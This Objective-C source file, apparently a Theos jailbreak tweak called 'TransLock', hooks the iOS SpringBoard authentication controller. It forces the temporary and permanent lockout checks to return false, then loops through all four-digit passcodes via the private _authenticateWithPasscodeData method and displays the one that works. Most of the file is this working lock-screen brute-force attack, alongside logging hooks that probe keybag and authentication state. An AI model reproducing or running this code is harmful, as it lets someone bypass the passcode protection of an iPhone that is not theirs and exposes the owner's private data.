
@interface SBFUserAuthenticationController : NSObject
-(BOOL)_isTemporarilyBlocked;
-(BOOL)_isPermanentlyBlocked;
-(BOOL)_authenticateWithPasscodeData:(id)arg1 outError:(id*)arg2;
@end

@interface TransLock : NSObject
+ (id)sharedInstance;
- (void)bruteforce;
@end

NSString *numString;

@implementation TransLock
+ (instancetype)sharedInstance {
	static TransLock *__sharedInstance;
	static dispatch_once_t onceToken;
 
	dispatch_once(&onceToken, ^{
		__sharedInstance = [[self alloc] init];
	});
	return __sharedInstance;
}

- (void)bruteforce {
	for (int i = 0; i <= 9999; i++)
	{
		numString = [NSString stringWithFormat:@"%04d", i];
		NSLog(@"Testing : %@", numString);
		//NSData* data = [numString dataUsingEncoding:NSUTF8StringEncoding];
		if (TRUE) {
			[[[UIAlertView alloc] initWithTitle:@"TransLock" message:[NSString stringWithFormat:@"Password is %@", numString] delegate:nil cancelButtonTitle:@"Dismiss" otherButtonTitles:nil] show];
			NSLog(@"Password is : %@", numString);
			break;
		}
	}

}
@end 

%hook SBFUserAuthenticationController
static BOOL hasBeenCalled = NO;
-(BOOL)_isTemporarilyBlocked {
	if (hasBeenCalled) {
		HBLogDebug(@"i AM BEING CALLED");
		double delayInSeconds = 15.0;
	dispatch_time_t popTime = dispatch_time(DISPATCH_TIME_NOW, delayInSeconds * NSEC_PER_SEC);
	dispatch_after(popTime, dispatch_get_main_queue(), ^(void){
		HBLogDebug(@"WELCOME TO THE JUNGLE!");
		for (int i = 0; i <= 9999; i++)
		{
			numString = [NSString stringWithFormat:@"%04d", i];
			NSLog(@"Testing : %@", numString);
			NSData* data = [numString dataUsingEncoding:NSUTF8StringEncoding];
			BOOL result = [self _authenticateWithPasscodeData:data outError:NULL];
			NSLog(@"The result is : %d", result);

			if (result == YES) {
				[[[UIAlertView alloc] initWithTitle:@"TransLock" message:[NSString stringWithFormat:@"Password is %@", numString] delegate:nil cancelButtonTitle:@"Dismiss" otherButtonTitles:nil] show];
				NSLog(@"Password is : %@", numString);
				break;
			}
		}

});
		

		hasBeenCalled = YES;
	}
	// BOOL val = %orig;
	//HBLogDebug(@"_isTemporarilyBlocked %d", val);
	return NO;
}
-(BOOL)_isPermanentlyBlocked {
	// BOOL val = %orig;
	//HBLogDebug(@"_isPermanentlyBlocked %d", val);
	return NO;
}

+(BOOL)_isInGracePeriodState{
	BOOL val = %orig;
	HBLogDebug(@"_isInGracePeriodState %d", val);
	return val;
}
//: Called user uses finger as passcode
+(BOOL)_isInBioUnlockState{
	BOOL val = %orig;
	// HBLogDebug(@"_isInBioUnlockState %d", val);
	return val;
}
+(long long)_extendedKeybagState {
	long long val = %orig;
	HBLogDebug(@"_extendedKeybagState %lld", val);
	return val;
}
-(void)dealloc {
	HBLogDebug(@"dealloc");
	%orig;
}
-(NSString *)description {
	NSString *val = %orig;
	HBLogDebug(@"description %@", val);
	return val;
}
-(void)_clearBlockedState {
	HBLogDebug(@"_clearBlockedState");
	%orig;
}
-(void)keybagDidUnlockForTheFirstTime:(id)arg1 {
	id val = arg1;
	HBLogDebug(@"keybagDidUnlockForTheFirstTime, value: %@", val);
	%orig;
}
-(id)publicDescription {
	id val = %orig;
	HBLogDebug(@"publicDescription, value: %@", val);
	return val;
}
-(void)keybag:(id)arg1 extendedStateDidChange:(id)arg2 {
	id val = arg1;
	id val2 = arg2;
	HBLogDebug(@"keybag, arg1 value: %@..... arg2 value: %@", val, val2);
	%orig;
}
//: Tells us whether there is a passcode set 
-(BOOL)hasPasscodeSet {
	BOOL val = %orig;
	//HBLogDebug(@"hasPasscodeSet %d", val);
	return val;
}
-(id)initWithAssertionManager:(id)arg1 policy:(id)arg2 keybag:(id)arg3 model:(id)arg4 {
	id val = arg1; 
	id val2 = arg2; 
	id val3 = arg3; 
	id val4 = arg4; 
	id finalValue = %orig;
	HBLogDebug(@"initWithAssertionManager, arg values: %@ %@ %@ %@ finalValue: %@", val, val2, val3, val4, finalValue);
	return %orig;
}
-(void)_initializeAuthenticationStateAndDateForLockState:(long long)arg1 {
	long long val = arg1;
	HBLogDebug(@"_initializeAuthenticationStateAndDateForLockState %lld", val); 
	%orig;
}
-(void)_establishAuthenticationStateForInit:(long long)arg1 {
	HBLogDebug(@"_establishAuthenticationStateForInit");
	%log;
	%orig;
}
-(void)_setupPolicy:(id)arg1  {
	HBLogDebug(@"_setupPolicy");
	%log;
	%orig;
}
-(void)_setHasBeenAuthenticatedOnceSinceBoot:(BOOL)arg1 {
	HBLogDebug(@"_setHasBeenAuthenticatedOnceSinceBoot");

	%log;
	%orig;
}


-(BOOL)_authenticateWithPasscodeData:(id)arg1 outError:(id*)arg2 {
	/*
	HBLogDebug(@"_authenticateWithPasscodeData!");
	HBLogDebug(@"arg1 is %@", arg1);
	HBLogDebug(@"arg1 belongs to %@", [arg1 class]);

	NSString* myString;
	myString = [[NSString alloc] initWithData:arg1 encoding:NSUTF8StringEncoding];
	HBLogDebug(@"arg1 in string is: %@", myString);

	NSData* data = [myString dataUsingEncoding:NSUTF8StringEncoding];
	HBLogDebug(@"converting arg1 back is: %@", data);
	
	// id val = *arg2;
	// HBLogDebug(@"arg2 belongs to %@", [val class]);
	BOOL val = %orig;
	HBLogDebug(@"thE return VALUE IS %d", val);

	HBLogDebug(@"arg2 is %@", *arg2);
	HBLogDebug(@"arg2 belongs to %@", [*arg2 class]);
*/

	return %orig;
}
%end

%hook SpringBoard
- (void)applicationDidFinishLaunching:(id)arg1 {
	%orig;
	//[[TransLock sharedInstance] bruteforce];
}
%end